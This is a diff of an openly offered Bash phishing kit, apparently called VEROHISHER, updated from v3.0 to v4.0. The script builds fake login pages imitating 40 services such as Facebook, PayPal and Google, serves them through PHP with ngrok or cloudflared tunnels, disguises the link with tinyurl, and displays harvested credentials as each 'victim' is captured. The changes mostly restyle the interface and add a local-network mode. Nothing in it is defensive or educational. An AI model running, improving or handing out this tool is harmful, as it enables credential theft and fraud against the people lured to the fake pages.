@@ -1,12 +1,14 @@
 #!/bin/bash
 
-# VEROHISHER v3.0 PRO
+# VEROHISHER v4.0 ULTIMATE
 # Created by Vikk Official
-# 40 Templates | Professional UI | Auto Mask URL
+# 40 Templates | 3 Tunnels (LocalHost/Ngrok/Cloudflared) | Ultra Kece
 
 trap ctrl_c INT
 ctrl_c() {
-    echo -e "\n\033[1;91m\n[!] Stopping VEROHISHER...\n\033[0m"
+    echo -e "\n\033[1;91m\n╔════════════════════════════════════════╗${NC}"
+    echo -e "\033[1;91m║     [!] STOPPING VEROHISHER... [!]     ║${NC}"
+    echo -e "\033[1;91m╚════════════════════════════════════════╝${NC}\n"
     pkill -f php 2>/dev/null
     pkill -f ngrok 2>/dev/null
     pkill -f cloudflared 2>/dev/null
@@ -14,7 +16,7 @@ ctrl_c() {
     exit 1
 }
 
-# Warna Enhanced
+# ========== WARNA NEON ==========
 R='\033[1;91m'
 G='\033[1;92m'
 Y='\033[1;93m'
@@ -23,23 +25,35 @@ P='\033[1;95m'
 C='\033[1;96m'
 W='\033[1;97m'
 NC='\033[0m'
-BG_R='\033[41m'
-BG_G='\033[42m'
-BG_B='\033[44m'
+BLINK='\033[5m'
 BOLD='\033[1m'
-UNDERLINE='\033[4m'
+BG_BLACK='\033[40m'
 
-# Animasi loading
+# ========== ANIMASI LOADING KECE ==========
 loading() {
-    echo -ne "${Y}[${G}■${Y}]${NC} $1"
+    echo -ne "${C}[${G}◉${C}]${NC} ${BOLD}$1${NC} "
     for i in {1..3}; do
-        echo -ne "."
-        sleep 0.3
+        echo -ne "${Y}.${NC}"
+        sleep 0.2
     done
     echo -e " ${G}✓${NC}"
 }
 
-# Banner Profesional
+spinner() {
+    local pid=$1
+    local delay=0.1
+    local spinstr='|/-\'
+    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
+        local temp=${spinstr#?}
+        printf " [%c]  " "$spinstr"
+        local spinstr=$temp${spinstr%"$temp"}
+        sleep $delay
+        printf "\b\b\b\b\b\b"
+    done
+    printf "    \b\b\b\b"
+}
+
+# ========== BANNER ULTRA KECE ==========
 banner() {
     clear
     echo -e "${C}
@@ -53,17 +67,21 @@ banner() {
     ║        ╚═══╝  ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝╚═╝╚══════╝    ║
     ║                                                                          ║
     ╠══════════════════════════════════════════════════════════════════════════╣
-    ║                      ${W}VEROHISHER v3.0 PRO | 40 Templates${C}                    ║
-    ║                      ${W}Created by Vikk Official${C}                              ║
+    ║                    ${BLINK}${C}⚡ VEROHISHER v4.0 ULTIMATE ⚡${NC}${C}                     ║
+    ║                    ${W}Created by Vikk Official${C}                                ║
+    ╠══════════════════════════════════════════════════════════════════════════╣
+    ║ ${G}┌────────────────────────────────────────────────────────────────────┐${C} ║
+    ║ ${G}│${W}  40 Templates | 3 Tunnels | Auto Mask | Real-time Logs${G}              │${C} ║
+    ║ ${G}└────────────────────────────────────────────────────────────────────┘${C} ║
     ╚══════════════════════════════════════════════════════════════════════════╝
     "
 }
 
-# Cek dependency dengan loading
+# ========== CEK DEPENDENSI ==========
 dependencies() {
-    echo -e "${C}┌──────────────────────────────────────────────────────────────────────┐${NC}"
-    echo -e "${C}│${W}                    CHECKING DEPENDENCIES                            ${C}│${NC}"
-    echo -e "${C}└──────────────────────────────────────────────────────────────────────┘${NC}"
+    echo -e "${C}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${C}║${W}                        CHECKING DEPENDENCIES                           ${C}║${NC}"
+    echo -e "${C}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
     
     commands=("php" "curl" "wget" "unzip")
     for cmd in "${commands[@]}"; do
@@ -71,7 +89,7 @@ dependencies() {
             echo -e "${R}[!] $cmd not found! Installing...${NC}"
             pkg install $cmd -y >/dev/null 2>&1
         fi
-        echo -e "${G}[✓] $cmd installed${NC}"
+        echo -e "${G}   ✓ $cmd installed${NC}"
     done
     
     if [[ ! -e ngrok ]]; then
@@ -89,19 +107,18 @@ dependencies() {
         chmod +x cloudflared
     fi
     
-    echo -e "${G}┌──────────────────────────────────────────────────────────────────────┐${NC}"
-    echo -e "${G}│${W}                    ALL DEPENDENCIES READY                          ${G}│${NC}"
-    echo -e "${G}└──────────────────────────────────────────────────────────────────────┘${NC}"
+    echo -e "${G}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${G}║${W}                    ✓ ALL DEPENDENCIES READY ✓                          ${G}║${NC}"
+    echo -e "${G}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
     sleep 1
 }
 
-# Generate template (sama seperti sebelumnya tapi dengan logging lebih baik)
+# ========== GENERATE TEMPLATE PHISHING ==========
 generate_template() {
     local site=$1
     mkdir -p .server 2>/dev/null
     rm -rf .server/* 2>/dev/null
     
-    # Template mapping (40 sites - sama seperti sebelumnya)
     case $site in
         1)  name="Facebook"; logo="facebook"; color="#1877f2"; input1="Email or Phone"; input2="Password"; action="https://facebook.com";;
         2)  name="Instagram"; logo="instagram"; color="#e4405f"; input1="Username"; input2="Password"; action="https://instagram.com";;
@@ -234,10 +251,10 @@ header('Location: $action');
 ?>
 EOF
 
-    echo -e "${G}[✓] $name template ready${NC}"
+    echo -e "${G}   ✓ $name template ready${NC}"
 }
 
-# Mask URL dengan tinyurl
+# ========== MASK URL ==========
 mask_url() {
     local url=$1
     echo -e -n "${W}Mask URL with tinyurl? (y/n): ${NC}"
@@ -247,9 +264,9 @@ mask_url() {
         masked=$(curl -s "http://tinyurl.com/api-create.php?url=$url")
         if [[ -n "$masked" ]]; then
             echo "$masked" > .masked_link
-            echo -e "${G}[✓] Masked URL: $masked${NC}"
+            echo -e "${G}   ✓ Masked URL: $masked${NC}"
         else
-            echo -e "${R}[!] Masking failed, using original${NC}"
+            echo -e "${R}   [!] Masking failed, using original${NC}"
             masked=$url
         fi
     else
@@ -258,7 +275,7 @@ mask_url() {
     echo "$masked" > .final_link
 }
 
-# Start services
+# ========== START SERVICES DENGAN 3 TUNNEL ==========
 start_services() {
     loading "Starting PHP server"
     cd .server
@@ -266,98 +283,127 @@ start_services() {
     cd ..
     sleep 2
     
-    echo -e "${Y}[*] Select tunnel:${NC}"
-    echo -e "${C}┌────────────────────┐${NC}"
-    echo -e "${C}│ 1. Ngrok          │${NC}"
-    echo -e "${C}│ 2. Cloudflared    │${NC}"
-    echo -e "${C}└────────────────────┘${NC}"
-    echo -e -n "${W}Tunnel option: ${NC}"
+    echo -e "${C}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${C}║${W}                        SELECT TUNNEL METHOD                            ${C}║${NC}"
+    echo -e "${C}╠══════════════════════════════════════════════════════════════════════════╣${NC}"
+    echo -e "${C}║${G}                                                                        ${C}║${NC}"
+    echo -e "${C}║${G}         ┌─────────────────────────────────────────────────────────┐   ${C}║${NC}"
+    echo -e "${C}║${G}         │  ${Y}1. ${W}LocalHost (IP Lokal - Tanpa Internet)${G}              │   ${C}║${NC}"
+    echo -e "${C}║${G}         │  ${Y}2. ${W}Ngrok (Pakai Token - Bisa via Internet)${G}            │   ${C}║${NC}"
+    echo -e "${C}║${G}         │  ${Y}3. ${W}Cloudflared (Tanpa Token - Bisa via Internet)${G}      │   ${C}║${NC}"
+    echo -e "${C}║${G}         └─────────────────────────────────────────────────────────┘   ${C}║${NC}"
+    echo -e "${C}║${G}                                                                        ${C}║${NC}"
+    echo -e "${C}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
+    echo -e -n "${W}┌─[VEROHISHER]\n└──╼ TUNNEL option: ${NC}"
     read tunnel_opt
     
     case $tunnel_opt in
         1)
-            loading "Starting ngrok"
+            echo -e "${Y}┌─[LOCALHOST MODE ACTIVATED]${NC}"
+            echo -e "${Y}│${NC}"
+            LOCAL_IP=$(ip addr show wlan0 2>/dev/null | grep inet | awk '{print $2}' | cut -d/ -f1)
+            if [[ -z "$LOCAL_IP" ]]; then
+                LOCAL_IP=$(hostname -I | awk '{print $1}')
+            fi
+            if [[ -z "$LOCAL_IP" ]]; then
+                LOCAL_IP="127.0.0.1"
+            fi
+            LINK="http://$LOCAL_IP:8080"
+            echo -e "${G}└──╼ Local IP: ${C}$LINK${NC}"
+            echo "$LINK" > .link
+            ;;
+        2)
+            echo -e "${Y}┌─[NGROK MODE ACTIVATED]${NC}"
+            echo -e "${Y}│${NC}"
+            loading "Starting ngrok tunnel"
             ./ngrok http 8080 --log=ngrok.log > /dev/null 2>&1 &
             sleep 6
             LINK=$(curl -s http://localhost:4040/api/tunnels | grep -o 'https://[a-z0-9]*\.ngrok\.io' | head -1)
+            if [[ -z "$LINK" ]]; then
+                echo -e "${R}└──╼ [!] Ngrok failed! Try setting token: ./ngrok authtoken YOUR_TOKEN${NC}"
+                exit 1
+            fi
+            echo -e "${G}└──╼ Ngrok URL: ${C}$LINK${NC}"
+            echo "$LINK" > .link
             ;;
-        2)
-            loading "Starting cloudflared"
+        3)
+            echo -e "${Y}┌─[CLOUDFLARED MODE ACTIVATED]${NC}"
+            echo -e "${Y}│${NC}"
+            loading "Starting cloudflared tunnel"
             ./cloudflared tunnel --url http://localhost:8080 > /dev/null 2>&1 &
             sleep 6
             LINK=$(curl -s http://localhost:4040/api/tunnels | grep -o 'https://[a-z0-9]*\.trycloudflare\.com' | head -1)
+            if [[ -z "$LINK" ]]; then
+                echo -e "${R}└──╼ [!] Cloudflared failed!${NC}"
+                exit 1
+            fi
+            echo -e "${G}└──╼ Cloudflared URL: ${C}$LINK${NC}"
+            echo "$LINK" > .link
             ;;
         *)
-            loading "Starting ngrok (default)"
-            ./ngrok http 8080 --log=ngrok.log > /dev/null 2>&1 &
-            sleep 6
-            LINK=$(curl -s http://localhost:4040/api/tunnels | grep -o 'https://[a-z0-9]*\.ngrok\.io' | head -1)
+            echo -e "${R}[!] Invalid option! Using LocalHost as fallback${NC}"
+            LOCAL_IP=$(ip addr show wlan0 2>/dev/null | grep inet | awk '{print $2}' | cut -d/ -f1)
+            LINK="http://$LOCAL_IP:8080"
+            echo "$LINK" > .link
             ;;
     esac
-    
-    if [[ -z "$LINK" ]]; then
-        echo -e "${R}[!] Tunnel failed!${NC}"
-        exit 1
-    fi
-    
-    echo -e "${G}[✓] Tunnel active: $LINK${NC}"
-    echo "$LINK" > .link
 }
 
-# Tampilkan hasil dengan tabel
+# ========== SHOW LOGS DENGAN TABEL KECE ==========
 show_logs() {
-    echo -e "\n${C}┌──────────────────────────────────────────────────────────────────────┐${NC}"
-    echo -e "${C}│${W}                      WAITING FOR VICTIM                              ${C}│${NC}"
-    echo -e "${C}├──────────────────────────────────────────────────────────────────────┤${NC}"
-    echo -e "${C}│${G} LINK: ${W}$(cat .final_link)${C}                                                               │${NC}"
-    echo -e "${C}└──────────────────────────────────────────────────────────────────────┘${NC}"
+    echo -e "\n${C}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${C}║${W}                         WAITING FOR VICTIM                             ${C}║${NC}"
+    echo -e "${C}╠══════════════════════════════════════════════════════════════════════════╣${NC}"
+    echo -e "${C}║${G} LINK: ${C}$(cat .final_link)${C}                                                          ║${NC}"
+    echo -e "${C}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
     
-    # Auto copy to clipboard if termux-clipboard exists
     if command -v termux-clipboard-set &>/dev/null; then
         echo -n "$(cat .final_link)" | termux-clipboard-set
-        echo -e "${G}[✓] Link copied to clipboard!${NC}"
+        echo -e "${G}   ✓ Link copied to clipboard!${NC}"
     fi
     
-    echo -e "\n${Y}[*] Status: ${G}ONLINE${NC} | ${Y}Waiting for target...${NC}"
-    echo -e "${C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "\n${Y}┌─[STATUS]─────────────────────────────────────────────────────────────────┐${NC}"
+    echo -e "${Y}│${G}   STATUS: ${BLINK}🟢 ONLINE${NC}${G} | TUNNEL: ACTIVE | WAITING FOR TARGET...${NC}${Y}          │${NC}"
+    echo -e "${Y}└──────────────────────────────────────────────────────────────────────────┘${NC}"
+    echo -e "${C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
     
     while true; do
         if [[ -e .server/victims.txt ]]; then
             clear
             banner
-            echo -e "${R}┌──────────────────────────────────────────────────────────────────────┐${NC}"
-            echo -e "${R}│${W}                      NEW VICTIM CAPTURED!                           ${R}│${NC}"
-            echo -e "${R}├──────────────────────────────────────────────────────────────────────┤${NC}"
-            echo -e "${R}│${NC}"
+            echo -e "${R}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
+            echo -e "${R}║${W}                      🎯 NEW VICTIM CAPTURED! 🎯                        ${R}║${NC}"
+            echo -e "${R}╠══════════════════════════════════════════════════════════════════════════╣${NC}"
+            echo -e "${R}║${NC}"
             cat .server/victims.txt
-            echo -e "${R}│${NC}"
-            echo -e "${R}└──────────────────────────────────────────────────────────────────────┘${NC}"
+            echo -e "${R}║${NC}"
+            echo -e "${R}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
             echo -e "\n${Y}[*] Press Ctrl+C to stop or wait for more...${NC}"
-            echo -e "${C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+            echo -e "${C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
             sleep 8
         fi
         sleep 2
     done
 }
 
-# Menu utama (grid 2 kolom)
+# ========== MENU UTAMA (40 TEMPLATE) ==========
 menu() {
     banner
-    echo -e "${C}┌──────────────────────────────────────────────────────────────────────┐${NC}"
-    echo -e "${C}│${W}                    SELECT TARGET PLATFORM (1-40)                    ${C}│${NC}"
-    echo -e "${C}├─────────────────────────────┬────────────────────────────────────────┤${NC}"
-    echo -e "${C}│ 1.Facebook    2.Instagram   │ 21.Yahoo      22.eBay                   │${NC}"
-    echo -e "${C}│ 3.Google      4.Twitter     │ 23.Dropbox    24.Adobe                  │${NC}"
-    echo -e "${C}│ 5.Microsoft   6.Netflix     │ 25.WordPress  26.Tumblr                 │${NC}"
-    echo -e "${C}│ 7.PayPal      8.Steam       │ 27.Pinterest  28.Flickr                 │${NC}"
-    echo -e "${C}│ 9.Snapchat   10.TikTok      │ 29.Myspace    30.VK                     │${NC}"
-    echo -e "${C}│11.LinkedIn   12.GitHub      │ 31.Line       32.WeChat                 │${NC}"
-    echo -e "${C}│13.Reddit     14.Twitch      │ 33.Signal     34.IMDb                   │${NC}"
-    echo -e "${C}│15.Spotify    16.Amazon      │ 35.Hulu       36.Disney+                │${NC}"
-    echo -e "${C}│17.Apple      18.WhatsApp    │ 37.EpicGames  38.Origin                 │${NC}"
-    echo -e "${C}│19.Telegram   20.Discord     │ 39.Uplay      40.Custom URL             │${NC}"
-    echo -e "${C}└─────────────────────────────┴────────────────────────────────────────┘${NC}"
-    echo -e -n "${W}[VEROHISHER] Enter number: ${NC}"
+    echo -e "${C}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${C}║${W}                    SELECT TARGET PLATFORM (1-40)                    ${C}║${NC}"
+    echo -e "${C}╠═══════════════════════════╦══════════════════════════════════════════════╣${NC}"
+    echo -e "${C}║${Y} 1.Facebook    2.Instagram${C} ║${Y}21.Yahoo      22.eBay${C}                   ║${NC}"
+    echo -e "${C}║${Y} 3.Google      4.Twitter${C}  ║${Y}23.Dropbox    24.Adobe${C}                  ║${NC}"
+    echo -e "${C}║${Y} 5.Microsoft   6.Netflix${C}  ║${Y}25.WordPress  26.Tumblr${C}                 ║${NC}"
+    echo -e "${C}║${Y} 7.PayPal      8.Steam${C}    ║${Y}27.Pinterest  28.Flickr${C}                 ║${NC}"
+    echo -e "${C}║${Y} 9.Snapchat   10.TikTok${C}   ║${Y}29.Myspace    30.VK${C}                     ║${NC}"
+    echo -e "${C}║${Y}11.LinkedIn   12.GitHub${C}   ║${Y}31.Line       32.WeChat${C}                 ║${NC}"
+    echo -e "${C}║${Y}13.Reddit     14.Twitch${C}   ║${Y}33.Signal     34.IMDb${C}                   ║${NC}"
+    echo -e "${C}║${Y}15.Spotify    16.Amazon${C}   ║${Y}35.Hulu       36.Disney+${C}                ║${NC}"
+    echo -e "${C}║${Y}17.Apple      18.WhatsApp${C} ║${Y}37.EpicGames  38.Origin${C}                 ║${NC}"
+    echo -e "${C}║${Y}19.Telegram   20.Discord${C}  ║${Y}39.Uplay      40.Custom URL${C}             ║${NC}"
+    echo -e "${C}╚═══════════════════════════╩══════════════════════════════════════════════╝${NC}"
+    echo -e -n "${W}┌─[VEROHISHER]\n└──╼ Enter number: ${NC}"
     read option
     
     if [[ ! $option =~ ^[0-9]+$ ]] || [[ $option -lt 1 || $option -gt 40 ]]; then
@@ -372,7 +418,7 @@ menu() {
     show_logs
 }
 
-# Main
+# ========== MAIN ==========
 clear
 dependencies
 menu
